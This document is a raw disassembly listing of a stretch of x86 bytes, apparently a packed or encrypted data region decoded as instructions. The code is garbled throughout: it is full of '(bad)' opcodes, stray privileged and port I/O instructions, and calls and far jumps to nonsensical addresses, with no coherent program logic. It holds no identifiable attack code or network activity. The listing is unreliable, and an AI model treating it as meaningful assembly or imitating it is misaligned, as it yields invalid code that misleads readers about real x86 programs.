  41509b:	sub    ebx,DWORD PTR [ecx+0xa]
  41509e:	mov    eax,0xca913da5
  4150a3:	add    BYTE PTR [ebx-0x1446247b],0x1e
  4150aa:	aam    0x5c
  4150ac:	push   eax
  4150ad:	or     eax,ecx
  4150af:	mov    bh,0x66
  4150b1:	push   edx
  4150b2:	les    ebp,FWORD PTR [ecx+eiz*2-0x5a297d56]
  4150b9:	clc    
  4150ba:	add    ebx,DWORD PTR [ecx+0x413418df]
  4150c0:	test   DWORD PTR [eax],0x0
	...
  415132:	add    BYTE PTR [eax],al
  415134:	add    dl,BYTE PTR [edx]
  415136:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  41513c:	adc    ah,BYTE PTR [esi+0x6b4bc4d9]
  415142:	dec    eax
  415143:	mov    ds:0xe776,al
  415148:	cmc    
  415149:	add    BYTE PTR [eax],al
  41514b:	add    BYTE PTR [ecx-0x2aeb2bb8],bh
  415151:	jbe    0x415179
  415153:	loope  0x415143
  415155:	lds    edi,FWORD PTR [edx+0x3b]
  415158:	gs dec edi
  41515a:	inc    esi
  41515b:	pop    ss
  41515c:	popf   
  41515d:	out    0x5f,al
  41515f:	mov    al,ds:0x29a8fd85
  415164:	and    esp,DWORD PTR [eax-0x5e]
  415167:	rcr    BYTE PTR [eax],cl
  415169:	adc    al,0x98
  41516b:	or     dh,BYTE PTR [ecx+edi*4]
  41516e:	sub    DWORD PTR [ecx-0x2],ebp
  415171:	xchg   esi,eax
  415172:	add    al,0x21
  415174:	fwait
  415175:	outs   dx,DWORD PTR ds:[esi]
  415176:	dec    ebx
  415177:	inc    esp
  415178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415179:	call   0x918900d8
  41517e:	es mov esp,0xe60b0f3c
  415184:	jp     0x415169
  415186:	(bad)  
  415187:	iret   
  415188:	xor    ecx,DWORD PTR [eax+0x1fe9b530]
  41518e:	sar    DWORD PTR [ebx+0x5d016a6a],cl
  415194:	inc    esi
  415195:	int3   
  415196:	(bad)  
  415197:	repz js 0x4151fb
  41519a:	cmp    ebx,DWORD PTR [edi+0x6365ca9d]
  4151a0:	pop    ss
  4151a1:	fs in  eax,dx
  4151a3:	pop    eax
  4151a4:	xor    eax,DWORD PTR [esi+edx*4-0x2]
  4151a8:	cmp    BYTE PTR [edi],bl
  4151aa:	cmp    edi,DWORD PTR [edi-0x76]
  4151ad:	mov    bl,0x4f
  4151af:	call   0x58aaf104
  4151b4:	test   al,0x78
  4151b6:	inc    edi
  4151b7:	js     0x4151fe
  4151b9:	addr16 test eax,0xd3706e47
  4151bf:	dec    esi
  4151c0:	retf   0x6b31
  4151c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151c4:	xchg   edx,eax
  4151c5:	sub    DWORD PTR [edi],edx
  4151c7:	or     esp,DWORD PTR [ebp+0x49]
  4151ca:	mov    ecx,0x73143e28
  4151cf:	ins    BYTE PTR es:[edi],dx
  4151d0:	mov    dh,0x76
  4151d2:	add    al,0xdf
  4151d4:	test   BYTE PTR [ebx],dh
  4151d6:	or     al,0x77
  4151d8:	rcr    BYTE PTR [ecx+eiz*4-0x24d64ff1],1
  4151df:	push   ecx
  4151e0:	push   edi
  4151e1:	popf   
  4151e2:	sub    al,0xaf
  4151e4:	cmc    
  4151e5:	mov    ebx,0xa590ac95
  4151ea:	sub    BYTE PTR [edi+0x14],dh
  4151ed:	mov    ch,0xee
  4151ef:	aas    
  4151f0:	inc    esi
  4151f1:	mov    esp,0x7bc96175
  4151f6:	scas   al,BYTE PTR es:[edi]
  4151f7:	dec    edx
  4151f8:	fwait
  4151f9:	inc    esp
  4151fa:	call   esi
  4151fc:	mov    esp,DWORD PTR [ebp-0x34]
  4151ff:	inc    edi
  415200:	adc    al,0x4a
  415202:	mov    eax,0xd0bbdcb4
  415207:	push   cs
  415208:	adc    al,0x10
  41520a:	mov    eax,ds:0x12b0ebad
  41520f:	cmp    BYTE PTR [esi-0x46c6f29e],ah
  415215:	fadd   st,st(0)
  415217:	add    ecx,DWORD PTR [edx]
  415219:	clc    
  41521a:	xor    eax,0x1d4e8e0c
  41521f:	sbb    eax,0xa9c4ce
  415224:	or     al,0xbd
  415226:	out    dx,eax
  415227:	mov    ecx,0x7e57f36c
  41522c:	dec    ebx
  41522d:	mov    bl,BYTE PTR [ecx-0x50]
  415230:	fisub  DWORD PTR [esp+ebp*8]
  415233:	sbb    bl,bh
  415235:	les    eax,FWORD PTR [ebx+0x4a614edb]
  41523b:	dec    esp
  41523c:	xchg   esi,eax
  41523d:	push   cs
  41523e:	(bad)  
  41523f:	cld    
  415240:	mov    bh,0x0
	...
  4152b2:	add    BYTE PTR [eax],al
  4152b4:	add    DWORD PTR [ecx-0x2122293],eax
  4152ba:	mov    cl,0xdd
  4152bc:	stos   BYTE PTR es:[edi],al
  4152bd:	dec    edx
  4152be:	out    0x6e,al
  4152c0:	(bad)  
  4152c1:	nop
  4152c2:	pop    es
  4152c3:	je     0x415330
  4152c5:	call   0x13652ca
  4152ca:	add    BYTE PTR [eax],al
  4152cc:	fdiv   QWORD PTR [edx]
  4152ce:	ins    BYTE PTR es:[edi],dx
  4152cf:	xchg   edx,eax
  4152d0:	adc    al,0x2b
  4152d2:	xchg   ebp,eax
  4152d3:	xchg   ebp,eax
  4152d4:	push   esi
  4152d5:	cli    
  4152d6:	inc    eax
  4152d7:	loopne 0x415274
  4152d9:	mov    ch,0x4f
  4152db:	mov    dh,0x1e
  4152dd:	push   es
  4152de:	cld    
  4152df:	(bad)  
  4152e0:	mul    DWORD PTR [eax-0x5e]
  4152e3:	cs aaa 
  4152e5:	adc    dh,BYTE PTR [ecx]
  4152e7:	call   0xbe10e257
  4152ec:	cwde   
  4152ed:	pop    edi
  4152ee:	rcl    BYTE PTR [edi+0x1b5e7f6a],cl
  4152f4:	mov    ds:0x20d941c1,eax
  4152f9:	mov    ebx,?
  4152fb:	fdiv   DWORD PTR [ecx]
  4152fd:	xchg   esi,eax
  4152fe:	mov    al,0xff
  415300:	fidivr WORD PTR [ebx-0x76]
  415303:	jp     0x415290
  415305:	dec    ebp
  415306:	or     al,0xf6
  415308:	xor    BYTE PTR [ecx],0xdd
  41530b:	aaa    
  41530c:	pextrw esi,(bad),0xc5
  41530e:	mov    ah,0xe8
  415310:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415311:	popa   
  415312:	mov    DWORD PTR [esi],esi
  415314:	ins    BYTE PTR es:[edi],dx
  415315:	jmp    0x415393
  415317:	jne    0x4152c1
  415319:	or     eax,0x1b9f9ab1
  41531e:	or     ecx,DWORD PTR [eax-0x59]
  415321:	repnz call FWORD PTR [esi+0x76a347ef]
  415328:	test   DWORD PTR [ecx],ecx
  41532a:	mov    eax,0x6f05a161
  41532f:	xchg   ebx,eax
  415330:	mov    edx,0x9c74f3df
  415335:	add    BYTE PTR [esi+0x58],dl
  415338:	stc    
  415339:	inc    esi
  41533a:	dec    edx
  41533b:	sub    esi,DWORD PTR [esi+0x1a]
  41533e:	jle    0x415364
  415340:	(bad)  
  415341:	(bad)  
  415342:	mov    ebp,0x5f05f354
  415347:	stos   DWORD PTR es:[edi],eax
  415348:	inc    ebp
  415349:	add    al,0x58
  41534b:	xchg   esp,eax
  41534c:	sub    DWORD PTR [ebp+0x11a9506f],edx
  415352:	dec    eax
  415353:	pop    edi
  415354:	(bad)  
  415355:	call   0xbb48:0x1cdc2240
  41535c:	cmp    al,0x79
  41535e:	mov    ah,0xf7
  415360:	or     eax,0x3b285618
  415365:	mov    cs,eax
  415367:	xchg   ecx,eax
  415368:	add    bh,bh
  41536a:	jne    0x415340
  41536c:	push   esi
  41536d:	push   esp
  41536e:	push   ebx
  41536f:	jbe    0x415395
  415371:	mov    eax,0x7bc01d32
  415376:	xchg   esi,eax
  415377:	cmp    ecx,edx
  415379:	jbe    0x415300
  41537b:	repz sub esp,DWORD PTR [edi+0x6f]
  41537f:	pop    ebx
  415380:	inc    edx
  415381:	mov    DWORD PTR [esi+0x74],ebx
  415384:	retf   
  415385:	xor    BYTE PTR [edx],0x69
  415388:	mov    eax,ds:0xc9fc3cbf
  41538d:	cmp    eax,DWORD PTR [edx+0x78]
  415390:	cwde   
  415391:	add    eax,0xcb47fd17
  415396:	mov    al,ds:0x5ba184ae
  41539b:	dec    eax
  41539c:	mov    bh,0x56
  41539e:	lea    edi,[esi]
  4153a0:	not    BYTE PTR [ecx-0x4c97dff0]
  4153a6:	jns    0x415336
  4153a8:	arpl   WORD PTR [eax],sp
  4153aa:	inc    ecx
  4153ab:	and    esp,ebp
  4153ad:	aas    
  4153ae:	pop    ds
  4153af:	or     al,0x57
  4153b1:	inc    edx
  4153b2:	and    al,0x26
  4153b4:	and    bh,ah
  4153b6:	(bad)
  4153ba:	mov    ebx,0x4fb3e2b2
  4153bf:	es xchg ecx,eax
	...
  415431:	add    BYTE PTR [eax],al
  415433:	add    BYTE PTR [ebx+0x73],bl
  415436:	inc    edx
  415437:	or     eax,0x775f3d6a
  41543c:	leave  
  41543d:	bnd jl 0x4153de
  415440:	jecxz  0x41541e
  415442:	es push 0x60
  415445:	jmp    0x136544a
  41544a:	add    BYTE PTR [eax],al
  41544c:	jmp    0x4154c4
  41544e:	sub    DWORD PTR [ecx+0x765e87c0],esp
  415454:	out    0xb3,eax
  415456:	sbb    al,0x80
  415458:	push   esi
  415459:	inc    ebp
  41545a:	mov    al,0x7f
  41545c:	pop    edi
  41545d:	jno    0x415487
  41545f:	adc    eax,DWORD PTR [ebx]
  415461:	mov    bl,0x9b
  415463:	push   ebx
  415464:	fisub  WORD PTR [edi]
  415466:	jae    0x415465
  415468:	arpl   WORD PTR [esi+0x287e9ba4],dx
  41546e:	cmp    ecx,DWORD PTR [ecx]
  415470:	fmul   st,st(1)
  415472:	fadd   DWORD PTR [edi+eiz*2]
  415475:	loopne 0x41542d
  415477:	jl     0x415479
  415479:	cvttps2pi mm5,QWORD PTR [ebx+esi*2-0x4511b926]
  415481:	mov    al,ds:0x2c5294fe
  415486:	adc    al,BYTE PTR [edx-0x7c3742d6]
  41548c:	dec    edi
  41548d:	xchg   esp,edi
  41548f:	repnz sti 
  415491:	mov    ebx,0x4f92f24
  415496:	loop   0x415506
  415498:	call   0x3f6ff202
  41549d:	push   esp
  41549e:	and    al,0x61
  4154a0:	pop    ds
  4154a1:	push   edx
  4154a2:	inc    esi
  4154a3:	sbb    dl,BYTE PTR [ecx-0x610c681d]
  4154a9:	mov    gs,ebx
  4154ab:	rcr    BYTE PTR [eax+0x3c31057b],cl
  4154b1:	mov    esi,0x97d031d0
  4154b6:	sbb    BYTE PTR [ebx+0x5d0cae65],0xa5
  4154bd:	ins    BYTE PTR es:[edi],dx
  4154be:	adc    BYTE PTR [edi+0x6985767f],bl
  4154c4:	imul   edx,DWORD PTR [ebx-0xe9ae1f4],0xc6bce568
  4154ce:	mov    ah,0xef
  4154d0:	dec    edi
  4154d1:	jnp    0x415470
  4154d3:	mov    dl,BYTE PTR [ebx]
  4154d5:	gs dec esi
  4154d7:	inc    esp
  4154d8:	or     BYTE PTR [eax+0x2e1bdf11],ch
  4154de:	push   esp
  4154df:	aad    0xb1
  4154e1:	mov    ah,0x29
  4154e3:	xchg   edi,eax
  4154e4:	mov    WORD PTR [ebx+0x7c],fs
  4154e7:	rcl    BYTE PTR [eax],cl
  4154e9:	push   ebp
  4154ea:	pop    ecx
  4154eb:	push   eax
  4154ec:	sub    BYTE PTR [eax+0x292a4f03],bl
  4154f2:	and    eax,0x8c820ddb
  4154f7:	repz mov edi,0xa459e156
  4154fd:	push   ds
  4154fe:	sub    al,0x42
  415500:	mov    esp,0xd0f902e9
  415505:	fwait
  415506:	xor    BYTE PTR [ebp+0x1],0x2b
  41550a:	fdivr  QWORD PTR [ebx+0x34]
  41550d:	xchg   edi,eax
  41550e:	xor    edx,DWORD PTR [edi+0x12]
  415511:	xchg   ebp,eax
  415512:	mov    edi,0xfc9156f7
  415517:	or     BYTE PTR [ecx],al
  415519:	div    DWORD PTR [ebx+0x5d939b65]
  41551f:	sbb    al,0xe0
  415521:	jo     0x41554b
  415523:	sbb    DWORD PTR [esi],edi
  415525:	iret   
  415526:	call   0x6018e90a
  41552b:	xchg   edx,eax
  41552c:	add    ecx,DWORD PTR [esi-0xca0dfc8]
  415532:	cvtpi2ps xmm3,QWORD PTR [edx]
  415535:	ja     0x4154fc
  415537:	push   cs
  415538:	popa   
  415539:	into   
  41553a:	jno    0x41551c
  41553c:	jmp    0x4154de
  41553e:	rcr    BYTE PTR [edi-0x1d],cl
	...
  4155b1:	add    BYTE PTR [eax],al
  4155b3:	add    BYTE PTR [edi+0x5e],bh
  4155b6:	cmc    
  4155b7:	ins    DWORD PTR es:[edi],dx
  4155b8:	cmc    
  4155b9:	out    dx,eax
  4155ba:	call   FWORD PTR [esi-0x5a]
  4155bd:	sub    BYTE PTR [esi+0x31],al
  4155c0:	daa    
  4155c1:	or     DWORD PTR [eax+0xea55dd],ebp
  4155c7:	add    ch,dh
  4155c9:	add    BYTE PTR [eax],al
  4155cb:	add    BYTE PTR ds:0x5563e52c,ch
  4155d1:	repz rcr BYTE PTR [ebx+0x64216024],1
  4155d8:	data16 inc BYTE PTR [edi-0x7f]
  4155dc:	clc    
  4155dd:	xchg   edi,eax
  4155de:	cli    
  4155df:	or     bl,ch
  4155e1:	jmp    DWORD PTR [eax+0xd]
  4155e4:	addr16 xchg esi,eax
  4155e6:	cmp    cl,bl
  4155e8:	cmp    ecx,DWORD PTR [edi]
  4155ea:	sub    ch,BYTE PTR [esi+0x6dde7681]
  4155f0:	inc    eax
  4155f1:	jno    0x4155e2
  4155f3:	sbb    esi,ebx
  4155f5:	sahf   
  4155f6:	add    eax,0x8c80d88c
  4155fb:	inc    ebx
  4155fc:	test   BYTE PTR [ecx+0x6f],ah
  4155ff:	mov    DWORD PTR [edx+ebx*1-0x3708b798],ebx
  415606:	loop   0x41562f
  415608:	mov    al,0x67
  41560a:	dec    DWORD PTR [edx]
  41560c:	or     edi,DWORD PTR ds:0xcba5fb9e
  415612:	(bad)  
  415613:	mov    ebp,0x15f084ef
  415618:	dec    eax
  415619:	or     DWORD PTR [edi+0x1dee8bc9],ecx
  41561f:	(bad)  
  415620:	das    
  415621:	jmp    0x99dcd2a5
  415626:	inc    ecx
  415627:	xor    DWORD PTR [ebx+ebp*1+0x28d88f4],edi
  41562e:	popa   
  41562f:	pop    eax
  415630:	adc    eax,ecx
  415632:	push   0x13e9e2ec
  415637:	cmc    
  415638:	mov    BYTE PTR [esi],al
  41563a:	stc    
  41563b:	test   al,0xe0
  41563d:	icebp  
  41563e:	ins    BYTE PTR es:[edi],dx
  41563f:	jne    0x41568d
  415641:	xor    al,0x9d
  415643:	inc    edi
  415644:	ss dec ebx
  415646:	lods   eax,DWORD PTR ds:[esi]
  415647:	std    
  415648:	div    BYTE PTR [ebx+0x102fabf9]
  41564e:	jae    0x415683
  415650:	(bad)  
  415651:	and    BYTE PTR [edi+0x5ffb5357],bl
  415657:	aaa    
  415658:	adc    DWORD PTR [ebx],eax
  41565a:	adc    al,0x7f
  41565c:	pop    ecx
  41565d:	xchg   esp,eax
  41565e:	outs   dx,DWORD PTR ds:[esi]
  41565f:	hlt    
  415660:	les    eax,FWORD PTR [eax-0x673191d0]
  415666:	xchg   DWORD PTR [eax],edi
  415668:	scas   al,BYTE PTR es:[edi]
  415669:	in     al,dx
  41566a:	out    0xd4,eax
  41566c:	aad    0x79
  41566e:	call   0x753b6ea2
  415673:	inc    ebp
  415674:	inc    ecx
  415675:	(bad)  [ebp+0x57]
  415678:	call   0x4359660f
  41567d:	fldcw  WORD PTR [edi+0x11]
  415680:	shl    BYTE PTR [edi+0x1a15a6ed],1
  415686:	push   esp
  415687:	lods   eax,DWORD PTR ds:[esi]
  415688:	pop    es
  415689:	cmc    
  41568a:	inc    eax
  41568b:	cld    
  41568c:	jecxz  0x415660
  41568e:	and    dh,ch
  415690:	icebp  
  415691:	scas   eax,DWORD PTR es:[edi]
  415692:	out    dx,al
  415693:	pop    ecx
  415694:	dec    ebp
  415695:	mov    eax,ds:0x259500b4
  41569a:	dec    ebp
  41569b:	sub    eax,0xc96708a9
  4156a0:	jmp    0xc4e0:0x1d5b1da5
  4156a7:	jno    0x41564f
  4156a9:	ds sbb al,0xd
  4156ac:	push   ds
  4156ad:	inc    eax
  4156ae:	push   edx
  4156af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156b0:	aaa    
  4156b1:	inc    esp
  4156b2:	std    
  4156b3:	jo     0x415664
  4156b5:	jge    0x41572c
  4156b7:	jne    0x415647
  4156b9:	mov    cl,0x4f
  4156bb:	outs   dx,DWORD PTR ds:[esi]
  4156bc:	fwait
  4156bd:	xchg   DWORD PTR [ebp+0x5c],edi
  4156c0:	or     eax,0x0
	...
  415731:	add    BYTE PTR [eax],al
  415733:	add    BYTE PTR [esi+0x2f],bh
  415736:	add    DWORD PTR [ebp+0x51],ebp
  415739:	outs   dx,DWORD PTR ds:[esi]
  41573a:	jle    0x41577b
  41573c:	dec    esp
  41573d:	xchg   esp,eax
  41573e:	call   0x2a4cdad3
  415743:	mov    ecx,0xeb4a
  415748:	cmc    
  415749:	add    BYTE PTR [eax],al
  41574b:	add    BYTE PTR [ebx-0x4a98fe62],dh
  415751:	xchg   edi,eax
  415752:	xchg   edi,eax
  415753:	dec    eax
  415754:	mov    bh,0x9
  415756:	push   ss
  415757:	adc    cl,bh
  415759:	ins    DWORD PTR es:[edi],dx
  41575a:	int3   
  41575b:	fwait
  41575c:	mov    al,0xc9
  41575e:	repz frstor fs:[edx+0x6d]
  415763:	dec    ebx
  415764:	mov    bh,dl
  415766:	xor    al,0x3a
  415768:	mov    ds:0xb49ab1b6,al
  41576d:	pop    ds
  41576e:	(bad)  
  41576f:	xchg   ecx,eax
  415770:	addr16 inc ebx
  415772:	es in  eax,dx
  415774:	xchg   dh,bl
  415776:	lahf   
  415777:	(bad)  
  415778:	fucomp st(5)
  41577a:	fild   WORD PTR [ebx+ecx*1-0x35ca2c09]
  415781:	iret   
  415782:	sub    BYTE PTR [esi+0x78],bh
  415785:	test   BYTE PTR [edi-0x52728004],dl
  41578b:	push   ss
  41578c:	sbb    edi,DWORD PTR [ecx]
  41578e:	lods   al,BYTE PTR ds:[esi]
  41578f:	push   cs
  415790:	outs   dx,BYTE PTR ds:[esi]
  415791:	sub    dl,BYTE PTR [eax+0x75]
  415794:	dec    ebx
  415795:	sub    eax,0x2217ae47
  41579a:	or     esp,edx
  41579c:	xor    eax,0x77adb2fb
  4157a1:	popa   
  4157a2:	cli    
  4157a3:	fbld   TBYTE PTR [ecx+0x54]
  4157a6:	mov    ebx,0x2835a484
  4157ab:	xchg   ebp,eax
  4157ac:	mov    ebp,0xba07f94f
  4157b1:	jmp    0xb47d:0x1571f444
  4157b8:	(bad)  [ecx]
  4157ba:	jo     0x4157a5
  4157bc:	add    BYTE PTR [ebp-0x4219207e],ah
  4157c2:	outs   dx,BYTE PTR ds:[esi]
  4157c3:	xchg   esp,eax
  4157c4:	dec    edx
  4157c5:	imul   esp,DWORD PTR [ebx+0x7b6875f2],0xcf8661f2
  4157cf:	or     BYTE PTR [esi],ah
  4157d1:	mov    ds:0x187c543c,al
  4157d6:	or     bh,0x3b
  4157d9:	xchg   esi,eax
  4157da:	pop    ss
  4157db:	rol    BYTE PTR [ebx],1
  4157dd:	sbb    dh,BYTE PTR [edx+0x77d2a9fb]
  4157e3:	stc    
  4157e4:	std    
  4157e5:	sub    DWORD PTR ds:[edx-0x7d],esp
  4157e9:	hlt    
  4157ea:	ins    DWORD PTR es:[edi],dx
  4157eb:	xor    esi,DWORD PTR [esi-0x6f]
  4157ee:	mov    esp,0xec7fec1d
  4157f3:	cmp    ch,ch
  4157f5:	pop    ebp
  4157f6:	cdq    
  4157f7:	inc    ecx
  4157f8:	inc    esi
  4157f9:	aad    0xae
  4157fb:	and    al,0x1c
  4157fd:	pop    ds
  4157fe:	hlt    
  4157ff:	mov    dh,0xef
  415801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415802:	mov    ebp,0x674e95e
  415807:	ds sbb eax,esi
  41580a:	jo     0x4157f9
  41580c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41580d:	cmp    bl,al
  41580f:	sub    DWORD PTR es:[edi-0x36],edx
  415813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415814:	mov    ds:0xb3ef79df,eax
  415819:	dec    edx
  41581a:	mov    al,ds:0xf26ddf6d
  41581f:	jmp    0x415844
  415821:	addr16 stc 
  415823:	dec    edx
  415824:	sbb    BYTE PTR [eax+0x2f1e142d],cl
  41582a:	nop    DWORD PTR ds:0xdf8e6910
  415831:	inc    edx
  415832:	xor    BYTE PTR es:[ecx-0x53],ah
  415836:	lock out 0xb3,eax
  415839:	test   DWORD PTR [ecx-0x86c16f0],0xa455
	...
  4158b3:	add    BYTE PTR [ebx],cl
  4158b5:	jle    0x415889
  4158b7:	and    esi,edi
  4158b9:	scas   eax,DWORD PTR es:[edi]
  4158ba:	sti    
  4158bb:	jle    0x41583e
  4158bd:	inc    eax
  4158be:	sbb    eax,0x6f6984fe
  4158c3:	in     al,0x3f
  4158c5:	in     al,dx
  4158c6:	add    BYTE PTR [eax],al
  4158c8:	cmc    
  4158c9:	add    BYTE PTR [eax],al
  4158cb:	add    dl,cl
  4158cd:	pop    ebx
  4158ce:	or     BYTE PTR [esi+edx*8+0x10befca3],al
  4158d5:	cmp    al,BYTE PTR [eax-0x741382fc]
  4158db:	xchg   ebp,eax
  4158dc:	stc    
  4158dd:	dec    edi
  4158de:	movsx  ecx,BYTE PTR [edx-0x5e]
  4158e2:	dec    eax
  4158e3:	inc    ecx
  4158e4:	ja     0x415870
  4158e6:	imul   ebp,edi,0x40
  4158e9:	out    0x63,al
  4158eb:	adc    ah,BYTE PTR [ecx]
  4158ed:	push   0xbad15f71
  4158f2:	mov    bh,0xff
  4158f4:	cli    
  4158f5:	stos   BYTE PTR es:[edi],al
  4158f6:	les    edx,FWORD PTR [edi+0x1d]
  4158f9:	mov    al,ds:0x6064aed2
  4158fe:	mov    edx,0x12911c62
  415903:	sub    ah,BYTE PTR [edi+0x2550973d]
  415909:	lods   eax,DWORD PTR ds:[esi]
  41590a:	jge    0x4158a2
  41590c:	push   ds
  41590d:	jne    0x4158bf
  41590f:	push   edx
  415910:	(bad)  
  415911:	xchg   ebp,eax
  415912:	jmp    0x41593c
  415914:	(bad)  
  415915:	out    dx,eax
  415916:	test   BYTE PTR [ebx+0x64a43d53],ch
  41591c:	cwde   
  41591d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41591e:	pusha  
  41591f:	addr16 pop ecx
  415921:	xor    BYTE PTR [edi-0x6e069ac7],0x6f
  415928:	push   esi
  415929:	fsubr  DWORD PTR [esi+0x64]
  41592c:	jecxz  0x415960
  41592e:	in     al,0x65
  415930:	dec    esi
  415931:	jecxz  0x415900
  415933:	push   0x10c8fe63
  415938:	out    0xbd,al
  41593a:	jge    0x4159b0
  41593c:	dec    eax
  41593d:	mov    al,0x99
  41593f:	out    dx,eax
  415940:	sbb    al,0x92
  415942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415943:	inc    edi
  415944:	and    eax,0x71518fd1
  415949:	(bad)  
  41594a:	imul   ch
  41594c:	sub    DWORD PTR [edx-0x45],0x1cc25f5f
  415953:	mov    al,ds:0x289bf4f6
  415958:	adc    DWORD PTR ds:0xa0daf734,edi
  41595e:	sbb    BYTE PTR [edx+0x0],ch
  415961:	outs   dx,BYTE PTR ds:[esi]
  415962:	pop    esp
  415963:	jle    0x415947
  415965:	pop    edx
  415966:	xlat   BYTE PTR ds:[ebx]
  415967:	aas    
  415968:	and    ch,BYTE PTR [ebx-0x11]
  41596b:	pop    edi
  41596c:	mov    ecx,0xdf225f72
  415971:	sar    DWORD PTR [eax-0x7],0xa5
  415975:	dec    esp
  415976:	dec    DWORD PTR [esi-0x4a624ffb]
  41597c:	bswap  ecx
  41597e:	inc    ebx
  41597f:	xchg   esp,eax
  415980:	sbb    esp,edx
  415982:	and    eax,0xb2766100
  415987:	cmc    
  415988:	mov    eax,0xc0c80f04
  41598d:	mov    al,ds:0xef28f732
  415992:	mov    dh,0x13
  415994:	push   ss
  415995:	repz fst DWORD PTR [edi]
  415998:	mov    bh,0xe
  41599a:	mov    cl,0x8a
  41599c:	pop    esi
  41599d:	clc    
  41599e:	jmp    0x4640de3d
  4159a3:	repnz fldcw WORD PTR [esi]
  4159a6:	mov    ebx,0x5319b170
  4159ab:	xor    eax,0xcea46859
  4159b0:	sub    DWORD PTR [ecx+edx*4-0x351bb35c],esp
  4159b7:	fstp   st(5)
  4159b9:	rcr    bh,1
  4159bb:	pop    ebp
  4159bc:	pushf  
  4159bd:	gs inc eax
  4159bf:	neg    DWORD PTR [ebp+0x0]
	...
  415a31:	add    BYTE PTR [eax],al
  415a33:	add    BYTE PTR [edi+0x7e363ed9],bl
  415a39:	neg    DWORD PTR [edi+0x4f7241f9]
  415a3f:	lahf   
  415a40:	js     0x415a65
  415a42:	arpl   WORD PTR [esi+0xed34],si
  415a48:	cmc    
  415a49:	add    BYTE PTR [eax],al
  415a4b:	add    BYTE PTR [eax+0x5d],dh
  415a4e:	push   esp
  415a4f:	sbb    eax,0xc41d6f50
  415a54:	mov    ds:0x5b2988f8,eax
  415a59:	in     eax,dx
  415a5a:	mov    esi,0x9182804f
  415a5f:	add    dl,BYTE PTR [edi-0x4e]
  415a62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a63:	(bad)  
  415a64:	out    0xbf,eax
  415a66:	xor    DWORD PTR [ecx+0x3fdb6e16],ebx
  415a6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a6d:	jg     0x415a3b
  415a6f:	mov    cl,0x43
  415a71:	pop    esp
  415a72:	aas    
  415a73:	rcl    bh,1
  415a75:	fdiv   QWORD PTR [edx+0x6b]
  415a78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a79:	div    BYTE PTR [eax]
  415a7b:	jle    0x415ad0
  415a7d:	leave  
  415a7e:	inc    esp
  415a7f:	pushf  
  415a80:	jnp    0x415af6
  415a82:	shr    DWORD PTR [eax+eax*2-0x69],0xa
  415a87:	sbb    edi,eax
  415a89:	mov    al,0xe2
  415a8b:	or     bh,BYTE PTR [esi+esi*2-0x4813b241]
  415a92:	ins    DWORD PTR es:[edi],dx
  415a93:	mov    edi,0x1f0d861
  415a98:	cli    
  415a99:	mov    eax,0x3bf13cdf
  415a9e:	dec    eax
  415a9f:	ins    BYTE PTR es:[edi],dx
  415aa0:	sbb    ch,BYTE PTR [ebx-0x74]
  415aa3:	out    0xc2,al
  415aa5:	dec    edi
  415aa6:	cli    
  415aa7:	lods   al,BYTE PTR ds:[esi]
  415aa8:	push   0x6b4b1cf1
  415aad:	fwait
  415aae:	dec    esp
  415aaf:	in     al,0xf0
  415ab1:	pop    ebx
  415ab2:	jno    0x415ae5
  415ab4:	fwait
  415ab5:	cs mov dh,0x24
  415ab8:	popf   
  415ab9:	dec    edi
  415aba:	retf   
  415abb:	push   ds
  415abc:	cmp    eax,0x5a174482
  415ac1:	jg     0x415ac5
  415ac3:	lods   eax,DWORD PTR ds:[esi]
  415ac4:	sub    DWORD PTR [ecx-0x51b08a89],eax
  415aca:	mov    esi,0x474b523e
  415acf:	test   al,0xb2
  415ad1:	mov    ecx,0x7563fbd
  415ad6:	xchg   ebx,eax
  415ad7:	adc    al,0x43
  415ad9:	mov    ch,bl
  415adb:	inc    ebx
  415adc:	adc    DWORD PTR [ebx+0x4ab416c3],ebp
  415ae2:	(bad)  
  415ae3:	fild   DWORD PTR [ecx-0x1c]
  415ae6:	pop    eax
  415ae7:	dec    esi
  415ae8:	fs dec edx
  415aea:	add    al,0x4c
  415aec:	imul   BYTE PTR [esi+0x148b1509]
  415af2:	sub    dh,BYTE PTR [edx+eiz*4+0x455f041a]
  415af9:	or     eax,0xda4fef69
  415afe:	cdq    
  415aff:	pushf  
  415b00:	and    bl,BYTE PTR [eax+0x77c7e54d]
  415b06:	fild   WORD PTR [esi*2-0x68d70a1]
  415b0d:	iret   
  415b0e:	loop   0x415b1e
  415b10:	pop    edi
  415b11:	popf   
  415b12:	xchg   esp,eax
  415b13:	and    BYTE PTR [edx],bh
  415b15:	ret    0x5708
  415b18:	pop    edi
  415b19:	shl    eax,0x34
  415b1c:	fisub  WORD PTR [ebx]
  415b1e:	push   edi
  415b1f:	inc    BYTE PTR [edi+0x3c016277]
  415b25:	sti    
  415b26:	jae    0x415ad4
  415b28:	inc    esp
  415b29:	push   edx
  415b2a:	add    BYTE PTR [ecx-0xf],bl
  415b2d:	sub    al,0x6f
  415b2f:	jecxz  0x415b9a
  415b31:	xor    al,0xb7
  415b33:	popaw  
  415b35:	test   eax,0x4be8f8d4
  415b3a:	jecxz  0x415b05
  415b3c:	mov    edx,0x43c55eb1
	...
  415bb1:	add    BYTE PTR [eax],al
  415bb3:	add    BYTE PTR [esp+eiz*2],dh
  415bb6:	push   ds
  415bb7:	jl     0x415c17
  415bb9:	jle    0x415c31
  415bbb:	ins    BYTE PTR es:[edi],dx
  415bbc:	pop    ds
  415bbd:	dec    DWORD PTR [edi+0x5a]
  415bc0:	inc    ebp
  415bc1:	push   eax
  415bc2:	pop    ebp
  415bc3:	shr    BYTE PTR [ecx],cl
  415bc5:	out    dx,al
  415bc6:	add    BYTE PTR [eax],al
  415bc8:	cmc    
  415bc9:	add    BYTE PTR [eax],al
  415bcb:	add    BYTE PTR [edx+0xf00485f],ch
